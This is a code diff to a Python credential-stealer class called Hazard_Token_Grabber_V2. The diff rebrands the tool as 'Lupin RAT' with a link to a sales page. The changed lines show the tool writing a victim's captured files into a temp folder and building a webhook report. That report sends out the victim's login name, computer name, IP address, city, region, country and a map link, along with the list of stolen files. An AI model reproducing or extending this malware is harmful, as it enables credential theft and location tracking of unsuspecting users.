@@ -45,10 +45,10 @@ class Hazard_Token_Grabber_V2:
                     x = f.read()
                     if x != "":
                         with open(self.tempfolder+os.sep+i, "w", encoding="cp437") as f:
-                            f.write("Made by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
+                            f.write("Lupin RAT | https://lupin.sell.app\n\n")
                         with open(self.tempfolder+os.sep+i, "a", encoding="cp437") as fp:
                             fp.write(x)
-                            fp.write("\n\nMade by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2")
+                            fp.write("\n\nhttps://lupin.sell.app")
                     else:
                         f.close()
                         try:
@@ -310,11 +310,11 @@ class Hazard_Token_Grabber_V2:
             "embeds": [
                 {
                     "author": {
-                        "name": "Hazard Token Grabber.V2",
-                        "url": "https://github.com/Rdimo/Hazard-Token-Grabber-V2",
+                        "name": "Lupin RAT",
+                        "url": "https://lupin.sell.app",
                         "icon_url": "https://i.ibb.co/LrYmL9w/Sans-titre-1.png"
                     },
-                    "description": f"**{os.getlogin()}** Just ran Hazard Token Grabber.V2\n```fix\nComputerName: {os.getenv('COMPUTERNAME')}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```",
+                    "description": f"**{os.getlogin()}** Just ran Lupin RAT\n```fix\nComputerName: {os.getenv('COMPUTERNAME')}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```",
                     "color": 16119101,
 
                     "thumbnail": {
@@ -322,7 +322,7 @@ class Hazard_Token_Grabber_V2:
                     },       
 
                     "footer": {
-                      "text": "Rdimo#6969 https://github.com/Rdimo/Hazard-Token-Grabber-V2"
+                      "text": "Lupin RAT"
                     }
                 }
             ]
